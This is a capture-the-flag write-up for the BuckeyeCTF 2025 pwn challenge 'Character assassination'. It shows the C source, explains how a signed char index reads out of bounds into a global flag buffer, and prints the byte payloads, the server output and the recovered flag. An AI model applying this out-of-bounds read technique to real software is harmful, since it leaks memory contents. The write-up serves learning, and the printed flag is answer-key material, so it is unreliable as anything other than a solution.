# :skull: BuckeyeCTF 2025 - Pwn Write-up. This event start on 01:00 AM (GMT + 8)…

---

## Character assassination

>

![img_1.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_1.png)
tHe bEsT WaY To wIn aN ArGuMeNt iS To rEpEaT EvErYtHiNg tHe oThEr pErSoN SaYs lIkE ThIs

![img_2.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_2.png)
```
ncat --ssl character-assassination.challs.pwnoh.io 1337
```

![img_3.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_3.png)
This challenge gave us this source code

![img_4.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_4.png)
```
#include <stdio.h>



![img_5.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_5.png)
char flag[64] = "bctf{fake_flag}";
char upper[] = {
'?', '?', '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
'\r', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?',
'?', '?', '?', '?', '?', '?', ' ', '!', '"', '#', '$', '%', '&',
'\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@',
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
'[', '\\', ']', '^', '_', '`', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
'U', 'V', 'W', 'X', 'Y', 'Z', '{', '|', '}', '~',
};
char lower[] = {
'?', '?', '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
'\r', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?',
'?', '?', '?', '?', '?', '?', ' ', '!', '"', '#', '$', '%', '&',
'\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@',
'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
'[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g',
'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
};



![img_6.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_6.png)
int main() {
setvbuf(stdin, 0, 2, 0);
setvbuf(stdout, 0, 2, 0);



![img_7.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_7.png)
FILE *f = fopen("flag.txt", "r");
if (f) {
fgets(flag, sizeof(flag), f);
fclose(f);
}



![img_8.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_8.png)
char input[256];



![img_9.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_9.png)
while (1) {
printf("> ");
if (!fgets(input, sizeof(input), stdin)) {
break;
}
for (int i = 0; i < sizeof(input) && input[i]; i++) {
char c = input[i];
if (i % 2) {
printf("%c", upper[c]);
} else {
printf("%c", lower[c]);
}
}
printf("\n");
}
}
```

![img_10.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_10.png)
As we can see, the challenge looks like safe from BoF, its also all protected with PIE, Canary etc. So, the bug is in this area

![img_11.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_11.png)
```
char c = input[i];
if (i % 2) {
printf("%c", upper[c]);
} else {
printf("%c", lower[c]);
}
```

![img_12.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_12.png)
Keep in mind, char on c only takes signed 8-bit integer (-128 to 127). So if we put char that ≥ 128, it wraps to -1 (Negative numbers). This can lead us to a Negative array indexing -> out of bounds read. Take a look at the defined code

![img_13.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_13.png)
```
char flag[64] = "bctf{fake_flag}";
char upper[] = {
'?', '?', '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
'\r', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?',
'?', '?', '?', '?', '?', '?', ' ', '!', '"', '#', '$', '%', '&',
'\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@',
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
'[', '\\', ']', '^', '_', '`', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
'U', 'V', 'W', 'X', 'Y', 'Z', '{', '|', '}', '~',
};
```

![img_14.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_14.png)
The flag will be appear if we send a negative number on the array upper. So this is already clear, now let's find out what's best offset to read flag (64).

![img_15.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_15.png)
```
127 + 64 = 191 + 1 (\x00) = 192 (0xc0)
```

![img_16.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_16.png)
Now lets test the payload by confirm the format flag first. Keep in mind also, the flag will be appear on (i % 2), so put the target after any character (in this case I'm using “A”)

![img_17.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_17.png)
```
payload = b"A\xc0A\xc1A\xc2A\xc3A\xc4
```

![img_18.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_18.png)
```
abacatafa{
```

![img_19.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_19.png)
Okay, it's confirmed work, now, lets craft it until the end of flag character “}”

![img_20.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_20.png)
```
payload = b"A\xc0A\xc1A\xc2A\xc3A\xc4A\xc5A\xc6A\xc7A\xc8A\xc9A\xcaA\xcbA\xccA\xcdA\xceA\xcfA\xd0A\xd1A\xd2A\xd3A\xd4A\xd5A\xd6A\xd7A\xd8A\xd9A\xdaA\xdbA\xdcA\xddA\xdeA\xdf"
```

![img_21.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_21.png)
```
abacatafa{awaOawa_aYaoaUa_asaOalaVaeaDa_aiaTa_a6a6a5afafa8a3ada}
```

![img_22.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_22.png)
Now, just replace the “a” > “”

![img_23.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_23.png)
```
>>> "abacatafa{awaOawa_aYaoaUa_asaOalaVaeaDa_aiaTa_a6a6a5afafa8a3ada}".replace("a", "")
'bctf{wOw_YoU_sOlVeD_iT_665ff83d}'
```

![img_24.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_24.png)
Flag: bctf{wOw_YoU_sOlVeD_iT_665ff83d}

![img_25.png](images/buckeyectf-2025-pwn-write-up-71f7243de9c6/img_25.png)
---
